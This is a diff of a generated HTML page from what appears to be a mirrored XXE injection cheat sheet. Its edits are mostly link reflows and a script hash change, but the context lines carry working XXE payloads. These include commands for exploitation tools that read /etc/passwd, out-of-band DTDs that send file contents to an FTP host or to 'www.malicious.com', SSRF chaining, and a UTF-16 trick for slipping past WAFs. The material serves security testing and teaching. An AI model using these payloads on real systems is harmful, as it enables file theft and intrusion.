@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.c3b45b6301b51f548f0398109b6e109d45abf1314e421f8ba62cf6f72646f958.js" integrity="sha256-w7RbYwG1H1SPA5gQm24QnUWr8TFOQh&#43;Lpiz29yZG&#43;Vg=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.4e979c41ea1da3eadea6cff7d8575b0664a8627f9c4b12e833490d3df55a9f7b.js" integrity="sha256-TpecQeodo&#43;reps/32FdbBmSoYn&#43;cSxLoM0kNPfVan3s=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -81,10 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-  
-    
-  
-
 
 
 <ul class="book-languages">
@@ -98,12 +94,6 @@ https://github.com/alex-shpak/hugo-book
     </label>
 
     <ul>
-      
-      <li>
-        <a href="https://www.grayhatfreelancing.com/ru/">
-          Ukrainian
-        </a>
-      </li>
       
     </ul>
   </li>
@@ -1484,18 +1474,14 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
   <a class="anchor" href="#tools">#</a>
 </h2>
 <ul>
-<li>
-  <a href="https://github.com/staaldraad/xxeserv">xxeftp</a> - A mini webserver with FTP support for XXE payloads
+<li><a href="https://github.com/staaldraad/xxeserv">xxeftp</a> - A mini webserver with FTP support for XXE payloads
 <pre tabindex="0"><code>sudo ./xxeftp -uno 443
 ./xxeftp -w -wps 5555
 </code></pre></li>
-<li>
-  <a href="https://github.com/lc/230-OOB">230-OOB</a> - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via 
-  <a href="http://xxe.sh/">http://xxe.sh/</a>
+<li><a href="https://github.com/lc/230-OOB">230-OOB</a> - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via <a href="http://xxe.sh/">http://xxe.sh/</a>
 <pre tabindex="0"><code>$ python3 230.py 2121
 </code></pre></li>
-<li>
-  <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
+<li><a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Enumerating /etc directory in HTTPS application:</span>
 </span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --path<span style="color:#f92672">=</span>/etc --file<span style="color:#f92672">=</span>/tmp/req.txt --ssl
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerating /etc directory using gopher for OOB method:</span>
@@ -1519,19 +1505,16 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Log requests only:</span>
 </span></span><span style="display:flex;"><span>ruby XXEinjector.rb --logger --oob<span style="color:#f92672">=</span>http --output<span style="color:#f92672">=</span>/tmp/out.txt
 </span></span></code></pre></div></li>
-<li>
-  <a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a> - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
+<li><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a> - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
 <pre tabindex="0"><code>ruby server.rb
 </code></pre></li>
-<li>
-  <a href="https://github.com/whitel1st/docem">docem</a> - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
+<li><a href="https://github.com/whitel1st/docem">docem</a> - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
 <pre tabindex="0"><code>./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
 ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
 ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
 ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
 </code></pre></li>
-<li>
-  <a href="http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html">otori</a> - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
+<li><a href="http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html">otori</a> - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
 <pre tabindex="0"><code>python ./otori.py --clone --module &#34;G-XXE-Basic&#34; --singleuri &#34;file:///etc/passwd&#34; --module-options &#34;TEMPLATEFILE&#34; &#34;TARGETURL&#34; &#34;BASE64ENCODE&#34; &#34;DOCTYPE&#34; &#34;XMLTAG&#34; --outputbase &#34;./output-generic-solr&#34; --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
 </code></pre></li>
 </ul>
@@ -1612,8 +1595,7 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
   Exploiting XXE to perform SSRF attacks
   <a class="anchor" href="#exploiting-xxe-to-perform-ssrf-attacks">#</a>
 </h2>
-<p>XXE can be combined with the 
-  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">SSRF vulnerability</a> to target another service on the network.</p>
+<p>XXE can be combined with the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">SSRF vulnerability</a> to target another service on the network.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT foo ANY &gt;</span>
@@ -1681,8 +1663,7 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % ext SYSTEM &#34;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&#34;&gt;</span> %ext;
 </span></span><span style="display:flex;"><span>]&gt;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;r&gt;&lt;/r&gt;</span>
-</span></span></code></pre></div><p>Send the content of <code>/etc/passwd</code> to &ldquo;
-  <a href="https://www.malicious.com">www.malicious.com</a>&rdquo;, you may receive only the first line.</p>
+</span></span></code></pre></div><p>Send the content of <code>/etc/passwd</code> to &ldquo;<a href="https://www.malicious.com">www.malicious.com</a>&rdquo;, you may receive only the first line.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT foo ANY &gt;</span>
@@ -1736,8 +1717,7 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/feature&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/features&gt;</span>
 </span></span></code></pre></div><p>Send the XML file to the <code>deploy</code> folder.</p>
-<p>Ref. 
-  <a href="https://github.com/brianwrf/CVE-2018-11788">brianwrf/CVE-2018-11788</a></p>
+<p>Ref. <a href="https://github.com/brianwrf/CVE-2018-11788">brianwrf/CVE-2018-11788</a></p>
 <h2 id="xxe-with-local-dtd">
   XXE with local DTD
   <a class="anchor" href="#xxe-with-local-dtd">#</a>
@@ -1766,14 +1746,12 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
 </span></span><span style="display:flex;"><span>    %local_dtd;
 </span></span><span style="display:flex;"><span>]&gt;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;&lt;/root&gt;</span>
-</span></span></code></pre></div><p>
-  <a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">Other payloads using different DTDs</a></p>
+</span></span></code></pre></div><p><a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">Other payloads using different DTDs</a></p>
 <h2 id="windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">
   Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
   <a class="anchor" href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">#</a>
 </h2>
-<p>From 
-  <a href="https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79">https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</a></p>
+<p>From <a href="https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79">https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</a></p>
 <h3 id="disclose-local-file">
   Disclose local file
   <a class="anchor" href="#disclose-local-file">#</a>
@@ -1871,8 +1849,7 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code>
 </li>
 </ul>
 <p>Then update the file <code>zip -u xxe.docx [Content_Types].xml</code></p>
-<p>Tool : 
-  <a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a></p>
+<p>Tool : <a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>DOCX/XLSX/PPTX
 </span></span><span style="display:flex;"><span>ODT/ODG/ODP/ODS
 </span></span><span style="display:flex;"><span>SVG
@@ -1919,8 +1896,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.</p>
 <p><code>xxe.dtd</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % d SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % c &#34;&lt;!ENTITY rrr SYSTEM &#39;ftp://x.x.x.x:2121/%d;&#39;&gt;</span>&#34;&gt; 
-</span></span></code></pre></div><p>Serve DTD and receive FTP payload using 
-  <a href="https://github.com/staaldraad/xxeserv">xxeserv</a>:</p>
+</span></span></code></pre></div><p>Serve DTD and receive FTP payload using <a href="https://github.com/staaldraad/xxeserv">xxeserv</a>:</p>
 <pre tabindex="0"><code>$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
 </code></pre><h3 id="xxe-inside-dtd-file">
   XXE inside DTD file
@@ -1941,59 +1917,36 @@ When all you control is the DTD file, and you do not control the <code>xml</code
 </h3>
 <p>In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br><br>
 <code>All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode</code>
-&ndash; 
-  <a href="https://www.w3.org/XML/xml-V10-4e-errata#E11">https://www.w3.org/XML/xml-V10-4e-errata#E11</a>
+&ndash; <a href="https://www.w3.org/XML/xml-V10-4e-errata#E11">https://www.w3.org/XML/xml-V10-4e-errata#E11</a>
 <br><br>
-we can convert the character encoding to <code>UTF-16</code> using 
-  <a href="https://man7.org/linux/man-pages/man1/iconv.1.html">iconv</a> to bypass the XXE WAF:-<br></p>
+we can convert the character encoding to <code>UTF-16</code> using <a href="https://man7.org/linux/man-pages/man1/iconv.1.html">iconv</a> to bypass the XXE WAF:-<br></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE &gt; utf16exploit.xml
 </span></span></code></pre></div><h2 id="references">
   References
   <a class="anchor" href="#references">#</a>
 </h2>
 <ul>
-<li>
-  <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing">XML External Entity (XXE) Processing - OWASP</a></li>
-<li>
-  <a href="http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a> - 6. Nov. 2014 - Von Christian Mainka</li>
-<li>
-  <a href="https://gist.github.com/staaldraad/01415b990939494879b4">[Gist] staaldraad - XXE payloads</a></li>
-<li>
-  <a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">[Gist] mgeeky - XML attacks</a></li>
-<li>
-  <a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf">Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @<em>will_is</em></a></li>
-<li>
-  <a href="http://en.hackdig.com/08/28075.htm">XXE ALL THE THINGS!!! (including Apple iOS&rsquo;s Office Viewer)</a></li>
-<li>
-  <a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li>
-<li>
-  <a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/">How we got read access on Google’s production servers</a> April 11, 2014 by  detectify</li>
-<li>
-  <a href="http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html">Blind OOB XXE At UBER 26+ Domains Hacked</a> August 05, 2016 by Raghav Bisht</li>
-<li>
-  <a href="https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf">OOB XXE through SAML</a> by Sean	Melia @seanmeals</li>
-<li>
-  <a href="https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html">XXE in Uber to read local files</a> 01/2017</li>
-<li>
-  <a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/">XXE inside SVG</a> JUNE 22, 2016 by YEO QUAN YANG</li>
-<li>
-  <a href="https://phonexicum.github.io/infosec/xxe.html">Pentest XXE - @phonexicum</a></li>
-<li>
-  <a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a> - 12/12/2018 - Arseniy Sharoglazov</li>
-<li>
-  <a href="https://portswigger.net/web-security/xxe">Web Security Academy &raquo; XML external entity (XXE) injection - 2019 PortSwigger Ltd</a></li>
-<li>
-  <a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">Automating local DTD discovery for XXE exploitation</a> - July 16 2019 by Philippe Arteau</li>
-<li>
-  <a href="https://www.4armed.com/blog/exploiting-xxe-with-excel/">EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</a></li>
-<li>
-  <a href="https://github.com/jmcnamara/excel-reader-xlsx/issues/10">excel-reader-xlsx #10</a></li>
-<li>
-  <a href="https://jbz.team/midnightsunctfquals2019/Rubenscube">Midnight Sun CTF 2019 Quals - Rubenscube</a></li>
-<li>
-  <a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">SynAck - A Deep Dive into XXE Injection</a> - 22 July 2019 - Trenton Gordon</li>
-<li>
-  <a href="https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf">Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server</a> - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing">XML External Entity (XXE) Processing - OWASP</a></li>
+<li><a href="http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a> - 6. Nov. 2014 - Von Christian Mainka</li>
+<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4">[Gist] staaldraad - XXE payloads</a></li>
+<li><a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">[Gist] mgeeky - XML attacks</a></li>
+<li><a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf">Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @<em>will_is</em></a></li>
+<li><a href="http://en.hackdig.com/08/28075.htm">XXE ALL THE THINGS!!! (including Apple iOS&rsquo;s Office Viewer)</a></li>
+<li><a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li>
+<li><a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/">How we got read access on Google’s production servers</a> April 11, 2014 by  detectify</li>
+<li><a href="http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html">Blind OOB XXE At UBER 26+ Domains Hacked</a> August 05, 2016 by Raghav Bisht</li>
+<li><a href="https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf">OOB XXE through SAML</a> by Sean	Melia @seanmeals</li>
+<li><a href="https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html">XXE in Uber to read local files</a> 01/2017</li>
+<li><a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/">XXE inside SVG</a> JUNE 22, 2016 by YEO QUAN YANG</li>
+<li><a href="https://phonexicum.github.io/infosec/xxe.html">Pentest XXE - @phonexicum</a></li>
+<li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a> - 12/12/2018 - Arseniy Sharoglazov</li>
+<li><a href="https://portswigger.net/web-security/xxe">Web Security Academy &raquo; XML external entity (XXE) injection - 2019 PortSwigger Ltd</a></li>
+<li><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">Automating local DTD discovery for XXE exploitation</a> - July 16 2019 by Philippe Arteau</li>
+<li><a href="https://www.4armed.com/blog/exploiting-xxe-with-excel/">EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</a></li>
+<li><a href="https://github.com/jmcnamara/excel-reader-xlsx/issues/10">excel-reader-xlsx #10</a></li>
+<li><a href="https://jbz.team/midnightsunctfquals2019/Rubenscube">Midnight Sun CTF 2019 Quals - Rubenscube</a></li>
+<li><a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">SynAck - A Deep Dive into XXE Injection</a> - 22 July 2019 - Trenton Gordon</li>
+<li><a href="https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf">Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server</a> - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li>
 </ul>
 </article>
  
